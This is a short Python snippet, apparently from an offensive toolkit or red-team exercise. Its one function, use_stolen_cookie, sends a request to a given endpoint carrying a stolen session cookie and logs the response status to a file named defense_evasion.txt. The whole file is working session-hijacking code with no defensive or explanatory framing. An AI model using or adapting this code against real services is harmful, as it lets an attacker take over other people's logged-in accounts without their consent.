import requests

def use_stolen_cookie(endpoint, cookie_value):
    try:
        r = requests.get(endpoint, cookies={"session": cookie_value}, timeout=5)
        output = f"{endpoint} - {r.status_code}"
        with open("results/defense_evasion.txt", "w") as f:
            f.write(output)
        return output
    except Exception as e:
        return f"Error: {e}"
